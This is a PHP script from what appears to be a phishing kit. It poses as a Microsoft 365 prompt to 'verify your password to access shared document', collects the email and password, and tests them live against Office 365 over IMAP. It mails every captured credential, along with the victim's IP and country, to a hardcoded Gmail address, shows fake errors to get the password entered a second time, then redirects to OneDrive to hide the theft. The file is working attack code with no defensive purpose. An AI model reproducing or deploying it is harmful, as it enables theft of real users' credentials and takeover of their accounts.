<?php session_start(); error_reporting(0); header('Access-Control-Allow-Origin: *');
$date = date("Y-m-d-H-i-s");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$user = $_POST['u'];
$pass = $_POST['p'];
if(!empty($pass) && !empty($user)) {
	$count = strlen ($pass);
	$recipient = "lhankerson7@gmail.com";
	if ($count > 3) {
		$Checker = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass);
		$checker = 0;
		if($Checker){
			$msg = "
			Email: ".$user."
			Pass : ".$pass."
			IP Address : ".$ip."
			Country : ".$country."
			";
			$msg = wordwrap($msg,70);
			mail($recipient,"Verified | $country | $ip",$msg);
			?>
			<script>
			$(".FORM1").hide();
			$(".Finish").show();
			window.location.replace("https://onedrive.com");
			</script>
			<?php
		} else {
			if(isset($_SESSION['t'])){
				$times = $_SESSION['t']+1;
			}else{
				$_SESSION['t'] = 1;
				$times = $_SESSION['t'];
			}
			$msg = "
			Email: ".$user."
			Pass : ".$pass."
			IP Address : ".$ip."
			Country : ".$country."
			";
			$msg = wordwrap($msg,70);
			mail($recipient,"Unverified | $country | $ip | $user",$msg);
			
			if($times>1){
			$_SESSION['t'] = null;
			?>
			<script>
			$(".FORM1").hide();
			$(".Finish").show();
			window.location.replace("https://onedrive.com");
			</script>
			<?php
			}else{
			?>
			<script>
			$("#pass").animate({left:0, opacity:"show"}, 1000);
			$("#error").empty();
			$("#error").show();
			$("#error").html("Incorrect password, verify your 365 password to access shared document<br>");
			</script>
			<?php 	
			}
		}
	} else {
		?>
		<script>
		$("#pass").animate({left:0, opacity:"show"}, 1000);
		$("#error").empty();
		$("#error").show();
		$("#error").html("Your	password is too short, verify your password to access shared document<br>");
		</script>
		
		<?php
	}
} else {
	?>
				
	<script>
	$("#pass").animate({left:0, opacity:"show"}, 1000);
	$("#error").empty();
	$("#error").show();
	$("#error").append("Please enter your password to access shared document<br>");	
	</script>
	
	<?php 
}

?>